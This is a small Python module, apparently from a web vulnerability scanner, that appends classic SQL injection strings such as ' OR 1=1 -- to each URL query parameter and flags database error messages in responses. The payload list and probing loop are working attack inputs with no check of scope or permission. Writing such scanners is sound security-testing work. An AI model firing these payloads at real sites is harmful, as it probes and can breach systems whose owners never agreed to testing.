# scanner/sqli.py

import requests
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
]

error_keywords = [
    "sql", "mysql", "database", "syntax error",
    "warning", "exception", "query failed"
]

def inject_payload(base_url, payload):
    """
    Takes a URL with parameters and injects payload into each parameter.
    Example:
        input: http://test.com/page?id=1&cat=2 + payload
        output: list of URLs with:
            id = "1' OR 1=1 --"
            cat = "2' OR 1=1 --"
    """
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query)

    injected_urls = []

    if not params:
        return []  # no parameters → cannot inject

    for key in params:
        temp_params = params.copy()
        temp_params[key] = params[key][0] + payload  # add payload

        new_query = urlencode(temp_params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))

        injected_urls.append(new_url)

    return injected_urls


def test_sqli(url):
    results = []

    # no parameters → skip
    if "?" not in url:
        return results

    for payload in payloads:
        test_urls = inject_payload(url, payload)

        for test_url in test_urls:
            try:
                resp = requests.get(test_url, timeout=5)

                if any(err in resp.text.lower() for err in error_keywords):
                    results.append({
                        "url": test_url,
                        "payload": payload,
                        "issue": "Possible SQL Injection"
                    })
            except Exception:
                pass

    return results
